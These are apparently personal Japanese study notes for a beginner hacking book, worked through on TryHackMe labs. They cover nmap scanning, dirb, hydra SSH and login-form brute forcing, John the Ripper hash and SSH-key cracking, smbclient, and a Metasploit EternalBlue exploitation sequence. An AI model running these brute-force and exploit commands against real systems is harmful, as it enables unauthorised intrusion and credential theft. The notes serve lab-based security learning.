# 7日間でハッキングを始める本

## 前提

- Kali Linux
    - Parallelsにて環境構築
        - `/Volumes/HDD/Parallels/Kali Linux 2024.2 ARM64.pvm`
    - ID/Pass
        - 共に`parallels`
    - `thm`にてTryHackMeにVPN接続するエイリアス設定済み
    - 基本的に以下の手順で進める
        1. Parallels立ち上げ
        1. ゲストOS（Kali Linux）起動
        1. ゲストOSにて`thm`コマンドでTryHackMeへVPN接続開始
            - フォアグラウンドで実行中の場合はCtrl+C、バックグラウンドで実行中の場合は`sudo pkill openvpn`でVPN接続解除
        1. ホストOSにてTryHackMeへログイン
        1. ホストOSにて任意のルームのターゲットマシンを起動する
    - `7DaysTryHacking 1`として環境構築直後の状態をスナップショットとして保存

## Basic Pentesting

- ポートスキャン
    - `nmap`コマンドを実行
        - `nmap -sV -Pn -oN namp.txt -v IPアドレス`
            - `-sV`：開いているポートのサービスバージョンを自動で特定する
            - `-Pn`：事前にICMPリクエストを送信して確認することなく、直接ポートスキャンを実行するオプション
                - ICMPがブロックされていた際にスキャンせずに終了ことを防ぐ
            - `-oN`：スキャン結果を保存する
            - `--script vuln`を行うことで脆弱性の検出も可能
- 辞書攻撃
    - `dirb`コマンド
        - 引数で指定したファイルに載っている文字列と同じ名前のディレクトリの存在を確かめる
        - 構文
            - `dirb <ターゲットURL> [ワードリストファイル] [オプション]`
            - 例：`dirb http://IPアドレス /usr/share/dirb/wordlists/small.txt`
        - ワードリストファイルを指定しない場合、デフォルトの辞書ファイルを使用する
    - `hydra`コマンド
        - パスワードクラックツール
        - 構文
            - `hydra -l <ユーザー名> -P <パスワードリスト> -t <スレッド数> <ターゲット> <プロトコル>`
            - 例
                - SSHのブルートフォース攻撃
                    ```
                    hydra -l admin -P /path/to/password_list.txt -t 4 192.168.1.100 ssh
                    ```
                    - adminユーザーで、パスワードリストを使い、4スレッドで192.168.1.100のSSH認証を試行
                - HTTP認証のテスト
                    ```
                    hydra -l user -P passwords.txt http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
                    ```
                    - /loginページで、失敗時に”incorrect”が返る場合に認証試行
    - John the Ripper
        - パスワードハッシュ形式の解析ツール
            - 対応ハッシュ形式
                - UNIX系
                    - /etc/passwd, /etc/shadow
                - Windows LM/NTLM
                - MD5, SHA-1, SHA-256, SHA-512
                - ZIP, PDF, Officeファイルのパスワードハッシュ
        - 使い方例
            - 辞書攻撃
                ```
                john --wordlist=/path/to/wordlist.txt hashes.txt
                ```
            - ルールベース攻撃
                ```
                john --wordlist=/path/to/wordlist.txt --rules hashes.txt
                ```
            - 解析結果の表示
                ```
                john --show hashes.txt
                ```
            - 秘密鍵ファイルのパスワード解析
                1. ハッシュ値抽出
                    ```
                    ssh2john id_rsa > hash.txt
                    ```
                1. 解析実行
                    ```
                    john --wordlist=/path/to/wordlist.txt hash.txt
                    ```
- Samba共有フォルダ
    - `smbclient -L IPアドレス`で指定したIPアドレスのサーバで利用可能な共有フォルダやプリンターなどの情報の一覧を取得する

## Blue

- Metasploit Framework
    - オープンソースのセキュリティ評価・脆弱性検証用フレームワーク
    - 主要なモジュールの種類
        - exploit
            - 脆弱性を突いてシステムに侵入するための攻撃コード
        - payload
            - exploit成功後に実行されるプログラム。シェルの取得やリバース接続など。
        - auxiliary
            - ポートスキャン、バージョン検出、ネットワーク解析など、攻撃補助のための機能
        - post
            - 侵入後にパスワードの取得やキーロガーの設置などを行う
        - encoder
            - ペイロードの検出回避や難読化のためのエンコード処理
        - nop
            - 攻撃コードの安定動作のための無操作命令
    - 使い方の概要
        1. ターゲットの選定と情報収集：auxiliaryモジュールでスキャンや調査を実施
        1. 脆弱性の特定と選択：exploitモジュールを選択し、ターゲットの脆弱性に合わせて設定
        1. ペイロードの選択：侵入後に何を行うか（シェル取得、ファイル転送など）を選ぶ
        1. 攻撃の実行：設定を確認し、攻撃を実行
        1. 侵入後の操作：postモジュールで追加操作や情報取得を行う
        - 使用例
            1. msfconsoleの起動
                ```
                msfconsole
                ```
            1. モジュールの検索
                ```
                search CVE-2017-0143
                ```
            1. モジュールの選択
                ```
                use exploit/windows/smb/ms17_010_eternalblue
                ```
            1. モジュールのオプションの確認と設定
                ```
                show options
                set RHOSTS ターゲットマシンのIPアドレス
                set LHOST ローカルマシンのIPアドレス
                ```
            1. エクスプロイトの実行
                ```
                exploit
                ```

